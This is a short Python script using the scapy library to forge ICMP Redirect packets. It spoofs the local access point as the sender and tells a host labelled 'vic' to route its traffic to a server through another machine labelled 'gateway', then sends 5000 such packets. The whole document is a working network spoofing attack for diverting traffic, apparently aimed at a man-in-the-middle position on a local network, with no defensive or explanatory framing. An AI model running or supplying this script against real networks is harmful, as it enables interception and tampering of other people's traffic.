from scapy.all import IP, UDP, ICMP, send

AP='192.168.1.1'
svr='192.168.1.107'
vic='192.168.1.146'
gateway='192.168.1.137'


for i in range(5000):
    # Define the original UDP packet
    original_ip = IP(src=vic, dst=svr)
    original_udp = UDP(sport=49521, dport=5005)
    udp_payload = b"Example UDP payload"
    original_packet = original_ip / original_udp / udp_payload

    # Print the original packet for reference
    print("Original UDP Packet:")
    original_packet.show()

    # Create the IP header for the ICMP Redirect packet
    icmp_ip = IP(src=AP, dst=vic)

    # Create the ICMP Redirect packet
    icmp_redirect = ICMP(type=5, code=1, gw=gateway) / original_ip / original_udp / udp_payload

    # Combine the IP layer with the ICMP Redirect
    full_icmp_packet = icmp_ip / icmp_redirect

    # Print the ICMP Redirect packet for reference
    print("\nICMP Redirect Packet:")
    full_icmp_packet.show()

    # Send the ICMP Redirect packet
    send(full_icmp_packet)
